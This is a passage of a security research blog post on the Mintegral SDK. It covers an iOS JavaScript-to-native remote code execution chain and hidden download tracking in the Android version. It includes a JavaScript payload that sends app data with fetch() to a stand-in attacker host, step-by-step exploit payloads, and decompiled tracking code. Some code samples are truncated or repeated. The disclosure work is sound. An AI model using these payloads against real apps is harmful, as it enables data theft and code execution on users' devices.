`MTGBaseBridgeWebView` implements the `-(void)webView:decidePolicyForNavigationAction:decisionHandler:` method of the [WKNavigationDelegate](https://developer.apple.com/documentation/webkit/wknavigationdelegate?language=objc) protocol. This method is called every time the navigation happens in the web view. This means we can trigger this method from within JavaScript by simply calling `location.href=something`. In the open source version of the SDK we found a regular expression that parses navigation request URLs: `mv://(.+?):(.+?)/(.+?)\\?([\\s\\S]*)`.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516902%2Fwordpress-sync%2F1-1.png&w=2560&q=75)

`-(void)callFunctionWithName:fucId:param:` in the screenshot above simply performs a call to `self` with `fucName` selector.

So, to call `-(void)handleNativeObject:parameters:` of `MTGBaseBridgeWebView` we need to have the following line of JavaScript code: `location.href = 'mv://1:fucId/handleNativeObject?<parameters>'`.

Please note that everything we have described above is still valid in the latest version of the SDK, at the time of writing, as well as the open source version of the SDK. The only exception is that `-(void)handleNativeObject:parameters:` has been deleted from the latest releases.

### Remote method invocation

We are not going to describe the full implementation of `MTGInvocationBoxing` and other classes. Instead we will show how it‚Äôs possible to craft malicious JavaScript code to trigger the remote method.

The following proof of concept attacks a "simple note" application, that has a NoteRepository class with two methods `+(void)save:` and `+(NSString*)load`.

We inject the malicious JavaScript code by replacing the Mintegral server with our own server implementation. The full source code of this application and server can be found [here](https://drive.google.com/file/d/1ss8SuYQx8mgvv4E8sRtaO9zupSRSOs83/view?usp=sharing) .

The malicious JavaScript code for this application is as follows:

```
window.WindVane = {
     onSuccess: function (_, data) {
         fetch('https://demo-evil-server.com/log?data=' + encodeURIComponent(atob(data)));
     }
 };

location.href = 'mv://1:fucId/handleNativeObject?{"uniqueIdentifier":"hbxtJ7QU+TPXJ75ZH+SXhFQTYbzP","name":"Y7KtHv==","result":{"type":3}}';
```

| **Value** | **Decoded** |
| --- | --- |
| hbxtJ7QU+TPXJ75ZH+SXhFQTYbzP | static\_NoteRepository |
| Y7KtHv== | load |

This code will call the `+(NSString*)load` method of the `NoteRepository` class and send the result to our *demo-evil-server.com/log* endpoint.

It uses the same obfuscation techniques as described in [the previous section](/blog/sour-mint-malicious-sdk/#payload-decoding). But the proof of concept already contains JavaScript code to perform encoding and decoding (see `banner.html`).

### Gaining full remote code execution (RCE)

In the example above we have seen how the SDK can be used to invoke any static method of an arbitrary class. In this section we will demonstrate how this can be leveraged to run any native code.

For demonstration purposes we will show how it‚Äôs possible to create a `UIAlertController` with the message "PWNED!".

Let‚Äôs look at the following Objective-C code as a reference:

```
UIAlertController *alert = [[UIAlertController alloc] init];
[alert setMessage:@"PWNED!"];
[[[[UIApplication sharedApplication] keyWindow] rootViewController] presentViewController:alert animated:YES completion:nil];
```

We need to figure out how to create and keep an instance of the `UIAlertController` between calls, how to get a shared application instance and how to call `presentViewController:animated:completion:` with the instance.

#### Step 1: Save ref to `UIAlertController` class

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhM==', // singleton_MTGSetting.jsonTitles
    'name': 'hF5TnFzqHkfTGrHXh3wQ4nE=', // setObject:forKey:
    'parameters': [
        {
            'type': 1,
            'value': {'uniqueIdentifier': 'hbxtJ7QU+25zNkeQhgxaYFPThrKsY75B'} // static_UIAlertController
        },
        {'type': 2, 'value': 'a' }
    ]
});
```

The `MTGRemoteCommandParser` supports two types of object references:

* `static` - gets a reference to a class object by name.
* `singleton` - performs multiple steps:

  + Gets a class by name (`MTGSetting` in our example).
  + Executes the `sharedInstance` method on the class. `[MTGSetting sharedInstance]`

    in Objective-C.
  + Uses `valueForKey:` to get dot-separated properties. In our case this will be `[[MTGSetting sharedInstance] valueForKey:@"jsonTitles"]`.

Note that `jsonTitles` is just an instance of `NSMutableDictionary`. In the exploit it is used as temporary storage for our refs. The `MTGRemoteCommandParser` supports next parameters types:

* `0` - number.
* `1` - reference.
* `2` - string.
* `4` - `nil`.

The reference (`1`) type allows us to pass a reference to an object as an argument of a method. Important to note that the `uniqueIdentifier` is parsed in exactly the same way as a top-level `uniqueIdentifier` - hence there is also support for the `singleton` type.

#### Step 2: Allocate a new instance of `UIAlertController` class

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhM==', // singleton_MTGSetting.jsonTitles
    'name': 'hF5TnFzqHkfTGrHXh3wQ4nE=', // setObject:forKey:
    'parameters': [
        {
            'type': 1,
            // singleton_MTGSetting.jsonTitles.a.alloc.init
            'value': {'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhBPtWrcsY7KUWrQ\/L+N='}
        },
        {'type': 2, 'value': 'b'}
    ]
});
```

All the magic is happening in `singleton_MTGSetting.jsonTitles.a.alloc.init` in this case. As we already know `singleton_MTGSetting.jsonTitles.a` provides us with a reference to the `UIAlertController` class. But, we need to figure out why `[[UIAlertController valueForKey:@"alloc"] valueForKey:@"init"]` works. From the documentation of [valueForKey:](https://developer.apple.com/documentation/objectivec/nsobject/1412591-valueforkey) we know:

*The search pattern that valueForKey: uses to find the correct value to return is described in* [*Accessor Search Patterns*](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/KeyValueCoding/SearchImplementation.html#//apple_ref/doc/uid/20000955) *in* [*Key-Value Coding Programming Guide*](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/KeyValueCoding/index.html#//apple_ref/doc/uid/10000107i)*.*

We discovered that `valueForKey:` can call any method by name if it is a zero-argument method.

So, we can now create a new instance of the `UIAlertController` class, that will be referenced by property `b` of `jsonTitles` dict.

#### Step 3: Set "PWNED!" message

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhBP0', // singleton_MTGSetting.jsonTitles.b
    'name': 'hF5Tnk5AhFcgHnE=', // setMessage:
    'parameters': [{'type': 2, 'value': 'PWNED!'}]
});
```

This step is pretty obvious - we call `setMessage:` on the `UIAlertController` instance to set the `PWNED!` message.

#### Step 4: Save ref to `UIApplication` class

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhM==', // singleton_MTGSetting.jsonTitles
    'name': 'hF5TnFzqHkfTGrHXh3wQ4nE=',
    'parameters': [
        {'type': 1, 'value': {'uniqueIdentifier': 'hbxtJ7QU+25zN+SMY7QUD+xuYF9='}}, // static_UIApplication
        {'type': 2, 'value': 'x' }
    ]
});
```

This step is similar to step 1. We need to save the `UIApplication` class reference in `jsonTitles.x`.

#### Step 5: Show the alert

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    // singleton_MTGSetting.jsonTitles.x.sharedApplication.keyWindow.rootViewController
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhBP9WgfED+zQHjcMh7euDFcTLkK\/WrwQ45JuYrxXJBPBYFKT5rQQJTfXYgxBYFesH+R=',
    // presentViewController:animated:completion:
    'name': 'hdzQhF5\/JcHuH+JaYFPThrKsY75BGrc\/Lk2tJ753GrfXY+SsH+xuYF91',
    'parameters': [
        {
            'type': 1,
            // singleton_MTGSetting.jsonTitles.b
            'value': {'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhBP0'}
        },
        {'type': 0, 'value': 1},
        {'type': 4} // nil
    ]
});
```

This step looks complicated, but it just utilizes various techniques from the previous steps. In the Objective-c code it will be as follows:

```
[MTGSetting.sharedInstance.jsonTitles.x.sharedApplication.keyWindow.rootViewController
    presentViewController:MTGSetting.sharedInstance.jsonTitles.b // this is out instance of UIAlertController
    animated: 1
    completion: nil
];
```

At this point we have demonstrated how an alert can be shown with a Remote Code Execution. You can find full payload [here](https://drive.google.com/file/d/1ss8SuYQx8mgvv4E8sRtaO9zupSRSOs83/view?usp=sharing) . To call the steps one-by-one we created an array of actions and executed each action in the `window.WindVane.onSuccess` callback (in turn, after a previous action was completed).

A video demonstrating how clipboard content can be leaked by delivering the exploit via malicious ad.

### Source of the JavaScript exploit

We‚Äôve already seen how the Mintegral SDK allows native remote code execution via JavaScript code. However, that JavaScript code is fully owned and controlled by Mintegral. But, interestingly, it‚Äôs possible to achieve the same via interactive ADs created by the advertisers themselves. The ads are JavaScript-based web pages.

Theoretically, an advertiser can accurately target a specific group of users or specific set of devices by delivering an malicious ad containing the JavaScript exploit.

### Conclusion

We can only speculate as to why Mintegral included the capability to invoke native methods remotely in their SDK, but from the way the classes were named, such as `MTGCommandDispatcher` and `MTGRemoteCommand`, we believe this was intentional. Additionally, Mintegral removed the code immediately after our publication, despite us not being aware of it at the time.

## [Download tracking in Android [October 2020]](/blog/sour-mint-malicious-sdk/#download-tracking)

### Overview

In the previous two sections of this research article we shared how the Snyk security team discovered malicious behavior in the Mintegral SDK that can be exploited on iOS devices leading to ad fraud, data leakage and remote code execution (RCE). We wanted to perform more research on the Android distribution of the SDK, which we‚Äôll cover in this section.
 In summary, here are our key findings:

1. Download uri tracking from Google, affecting both browser and app downloads, including regular file downloads, email attachments and Google Docs links.
2. Tracking all APK downloads, both organic or not.

This data is being sent back to Mintegral‚Äôs servers.

### Observed behavior

Upon downloading a Google Docs link, we noticed the following requests being sent from the app to *https://n.systemlog.me*:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516882%2Fwordpress-sync%2F2-1.png&w=2560&q=75)

This is the same endpoint that was used in the iOS SDK to report data back to the Mintegral server. The payload is encoded, but we can use the decode logic that is in the SDK binary, to get the following:

```

We have two additional encoded parameters, `clever` and `dvi`. After decoding them as well, we noticed something interesting:

```

    "p": "",
    "ul": [
        "https://docs.google.com/spreadsheets/export?id=10y1Nir_tWFM0PAc_iU9Rm0HcH0i4Gv6jsDxLfomWcWI&exportFormat=pdf",

    "cid": "0",
    "ct": "[x86]",
    "dmf": 760,
    "dmt": "1588"
}
```

As we can see, the URL of the google sheet we downloaded from the Google Drive app is sent to the backend in the `ul` file and the downloaded filename in the `kw` field while `dvi` holds some data on the device.

### Potential uses

In the iOS scenario, fraudulent duplicate clicks were sent from the client‚Äôs device onto Mintegral‚Äôs servers and then to the attribution provider (MMP). In this case, the downloaded or installed apks are reported to the servers and can potentially be used to generate server-side clicks. The following diagram demonstrates the data flow:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516921%2Fwordpress-sync%2F3-1.png&w=960&q=75)
### Alphab module

The behavior, mentioned above, is located in the alphab module which was described by Mintegral as an ‚ÄúOptimization package‚Äù:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516910%2Fwordpress-sync%2F4-1.png&w=2560&q=75)

Following [our publication](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/), the module was removed from the Mintegral site and seems to no longer be part of the distributed SDK. We‚Äôve decompiled the SDK and located the code responsible for this behavior.

### AlphaCommonConst class

```
public final class AlphaCommonConst {

    /* renamed from: a */
    public static String f0a = a.c("LdxThdi1WBK\\/WgfPhbxQYkeXHBPwHZKAJ7eXHM==");

    /* renamed from: b */
    public static String f1b = a.c("LdxThdi1WBK\\/WgfPhbxQYkeXHBPwHZKsYFh=");

```

This class contains many hard coded constant definitions. Some strings are obfuscated with their own custom Base64 based encoding scheme located in the `AlphabBase64Util` class, similar to what we observed in the iOS distribution.

After decoding we get the following strings:

```
aEqMQ3ckisLAfcxK7En575xOayJIYsT=                   = alphab_net_debug_action
aELKr0xI7ULIYeJAYeN6aEbPQEx6FAVVNPBVJPHmNZJXJZN=   = android.intent.action.PACKAGE_ADDED
7sHPNsx6f3H6fcnArsxzf0H2                           = getContentResolver
aELKr0xI7UL67iN6HinI                               = android.net.Uri
aELKr0xI7ULKaiJOa0cg7jLoYsLP7ELP9sng7ins7iC=       = android.database.ContentObserver
aELKr0xI7ULGYsLP7ELPFKb4YeJAYeJj7ib4Yp7ArR==       = android.content.ContentResolver
r0HeQibP7inoYsLP7ELP9sng7ins7iC=                   = registerContentObserver
aELKr0xI7ULGYsLP7ELPFKn2YscKascgfcnAasHIf0H2       = android.content.BroadcastReceiver
aELKr0xI7ULGYsLP7ELPFKA6f3H6fX7IYpJArR==           = android.content.IntentFilter
aEJKNEbPQEx6                                       = addAction
r0HeQibP7inj7EbAQi7ArR==                           = registerReceiver
```

These are used in the initialization steps we‚Äôll discuss next.

### Alphab receiver

In the `init()` method of the `AlphabReceiver` class, the [BroadcastReceiver](https://developer.android.com/reference/android/content/BroadcastReceiver) is being initialized with some of the previously obfuscated strings:

```
 try {
      AlphabReceiver alphabReceiver = new AlphabReceiver();
      Class cls = Class.forName(AlphaCommonConst.C0001b.f11f);
      Class cls2 = Class.forName(AlphaCommonConst.C0001b.f12g);
      Object newInstance = cls2.newInstance();
      Method method = IntentFilter.class.getMethod(AlphaCommonConst.C0001b.f13h, String.class);
      method.invoke(newInstance, AlphaCommonConst.C0000a.ACTION_NET_DEBUG);
      method.invoke(newInstance, AlphaCommonConst.C0000a.f5b);
      Context.class.getMethod(AlphaCommonConst.C0001b.f14i, cls, cls2).invoke(context, alphabReceiver, newInstance);
      } catch (Throwable th) {
            th.printStackTrace();
      }
```

by replacing this with the decoded strings, the code becomes:

```
AlphabReceiver alphab_receiver = new AlphabReceiver();
Class alphab_receiver_cls = Class.forName("android.content.BroadcastReceiver");
Class intent_filter_cls = Class.forName("android.content.IntentFilter");
Object intent_inst = intent_filter_cls.newInstance();
Method method = IntentFilter.class.getMethod("addAction", String.class);
method.invoke(intent_inst, "alphab_net_debug_action");
method.invoke(intent_inst, "android.intent.action.PACKAGE_ADDED");
Context.class.getMethod("registerReceiver", alphab_receiver_cls, intent_filter_cls)
		.invoke(context, alphab_receiver, intent_inst);
```

We can see that with use of the Java Reflection API, a new broadcast receiver is created that listens for two types of intents:

* `android.intent.action.PACKAGE_ADDED` - a system wide intent that triggers when a package is being installed on the device.
* `alphab_net_debug_action` - a custom intent that appears to detect network debugging.

Upon receiving the intent, the `AlphabReceiver` class constructs a `ParseAndLoad()` method:

```
public final class ParseAndLoad {

    /* renamed from: a */
    private Intent f89a;

    public ParseAndLoad(Intent intent) {
        this.f89a = intent;
        if (AlphaCommonConst.C0000a.ACTION_NET_DEBUG.equals(intent.getAction())) {
            AlphaCommonConst.is_net_debug = true;
        }
    }
}
```

This field is later on used in a condition:

```
public final class ParseAndLoad {

    /* renamed from: a */
    private Intent f89a;

    public ParseAndLoad(Intent intent) {
        this.f89a = intent;
        if (AlphaCommonConst.C0000a.ACTION_NET_DEBUG.equals(intent.getAction())) {
            AlphaCommonConst.is_net_debug = true;
        }
    }
}
```

Decompiling the two other methods in that if clause reveals that they check if the current network connection passes through a wifi proxy or a vpn client. These are meant to prevent debugging the app and sniffing its traffic. This intent allows the developers of the SDK to bypass this anti-debug functionality.

### Alphab observer

In a similar fashion, this [ContentObserver](https://developer.android.com/reference/android/database/ContentObserver)‚Äôs initialization block is also hidden within reflection and obfuscated strings:

```
C0014a aVar = new C0014a(this.f70i);
Object invoke = Context.class.getMethod(AlphaCommonConst.C0001b.f6a, new Class[0]).invoke(context, new Object[0]);
Class cls3 = Class.forName(AlphaCommonConst.C0001b.f7b);
                        Class cls4 = Class.forName(AlphaCommonConst.C0001b.f8c);                  Class.forName(AlphaCommonConst.C0001b.f9d).getMethod(AlphaCommonConst.C0001b.f10e, cls3, Boolean.TYPE, cls4).invoke(invoke, Uri.parse(AlphabBase64Util.m1b("asx6f3H6foh4FsJ4fsLzYscKrM==")), true, aVar);
```

After cleanup we get the following:

```
AlpahbObserver observer = new AlpahbObserver(handler);
Object contentResolverObject = Context.class.getMethod(AlphaCommonConst.REFLECT.GETCONTENTRESOLVER).invoke(context);
Class uriClass = Class.forName(AlphaCommonConst.REFLECT.URI_CLASS);
Class contentObserver = Class.forName(AlphaCommonConst.REFLECT.CONTENTOBSERVER_CLASS);
Class contentResolver = Class.forName(AlphaCommonConst.REFLECT.CONTENTRESOLVER_CLASS).getMethod(AlphaCommonConst.REFLECT.REGISTERCONTENTOBSERVER, uriClass, boolean.class, contentObserver)
	.invoke(contentResolverObject, Uri.parse(AlphabBase64Util.newBase64Decode(uriDownload)), true, observer);
```

This means that the content observer is registered to listen to the *content://downloads* uri and triggers whenever a file is downloaded to the device.

It will query the Android download manager for public downloads:

```
cursor = aVar.f64b.getContentResolver().query(Uri.parse(AlphabBase64Util.m1b("asx6f3H6foh4FsJ4fsLzYscKr2xMfEnzQEbm73xyY0q4aEJgFM==") + str), null, null, null, null);
```

and upon decoding the string we‚Äôll get the following:

```
cursor = aVar.f64b.getContentResolver()
		.query(Uri.parse("content://downloads/public_downloads" + str), null, null, null, null);
```

If the download URL meets any of the following conditions, a report to *https://n.systemlog.met/stlog* will be generated:

1. Ends with `apk` - for manual downloads.
2. Refers to a package that belongs to `com.android.vending` or the url contains google.com - will catch any Google app or even browser url matching the condition.

Below is the code snippet that sends the request to the *https://n.systemlog.met/stlog* server.

```
else if (message.what == AlphabReqImpl.this.f23d && (eVar = new SCReq(AlphabReqImpl.this.f20a)) != null) {
                g.a("AlphabReqImpl", "setting  is request");
                eVar.b(0, AlphaCommonConst.f0a, AlphabReqImpl.this.f25f, AlphabReqImpl.this.f26g);
            }
```

which equals to:

```
else if (message.what == AlphabReqImpl.this.f23d && (req = new SCReq(AlphabReqImpl.this.f20a)) != null) {
                g.a("AlphabReqImpl", "setting  is request");
                req.send(0, "http://n.systemlog.me/stlog", AlphabReqImpl.this.f25f, AlphabReqImpl.this.f26g);
```

And here we can see the parameters that we saw in the captured request in our example:

```
    static /* synthetic */ void m26a(ReqPKGAndReportManager dVar, String str, String str2, List list, String str3, String str4) {
        try {
            if (TextUtils.isEmpty(str2)) {
                str2 = "";
            }
            if (TextUtils.isEmpty(str)) {
                str = "";
            }
            JSONArray jSONArray = new JSONArray();
            JSONObject jSONObject = new JSONObject();
            if (jSONObject != null) {
                try {
                    jSONObject.put("p", str);
                    jSONObject.put("v", str2);
                    JSONArray jSONArray2 = new JSONArray();
                    if (list != null && list.size() >= 0) {
                        for (int i = 0; i < list.size(); i++) {
                            jSONArray2.put(list.get(i));
                        }
                    }
                    jSONObject.put("ul", jSONArray2);
                    jSONObject.put("kw", str3);
                    jSONObject.put("fl", str4);
                } catch (Throwable th) {
                    if (MIntegralConstans.DEBUG) {
                        th.printStackTrace();
                    }
                }
            }
            jSONArray.put(jSONObject);
            String b = com.mintegral.msdk.base.utils.a.b(jSONArray.toString());
            dVar.f40i = new c();
            if (!(dVar.f40i == null || dVar.f20a == null)) {
                dVar.f40i.a("clever", b);
            }
            dVar.mo10a(dVar.f40i);
```

* `p` - downloading package name i.e. the app
* `v` - app version
* `ul` - downloaded file‚Äôs url
* `kw` - downloaded filename
* `fl` - file size

### Demo app

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516907%2Fwordpress-sync%2F5-1.png&w=960&q=75)

In order to demonstrate the behavior, we created a demo app that allowed us to:

1. Enable net debug flag with reflection to bypass anti-debug logic

```
buttonIsNetDebug.setOnClickListener(new View.OnClickListener() {
   @Override
   public void onClick(View v) {
       try {
           Class AlphaCommonConst = Class.forName("com.alphab.a");
           AlphaCommonConst.getDeclaredField("d").set(null, true);
       } catch (Exception e) {
           e.printStackTrace();
       }
   }
});
```

2. Download a file from a url that contains google.com

```
buttonDownloadGoogleLogo.setOnClickListener(new View.OnClickListener() {
   @Override
   public void onClick(View v) {
       Uri uri = Uri.parse("https://images.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png");
       DownloadManager.Request request = new DownloadManager.Request(uri);
       request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "googlelogo_color_272x92dp.png");
       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_ONLY_COMPLETION);
       DownloadManager manager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
       manager.enqueue(request);
   }
});
```

3. Download a file from a url that ends with `apk`

```
buttonDownloadApk.setOnClickListener(new View.OnClickListener() {
   @Override
   public void onClick(View v) {
       Uri uri = Uri.parse("https://storage.evozi.com/apk/dl/16/09/04/com.shazam.android_1004300.apk?f=google.com");
       DownloadManager.Request request = new DownloadManager.Request(uri);
       request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "com.shazam.android_1004300.apk");
       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_ONLY_COMPLETION);
       DownloadManager manager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
       manager.enqueue(request);
   }
});
```

We captured the outbound requests with an http proxy. After clicking one of the download buttons, we can see a request being made to the server‚Äôs endpoint:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516907%2Fwordpress-sync%2F6-1.png&w=2560&q=75)

Here‚Äôs a video demonstrating the tracking behavior:
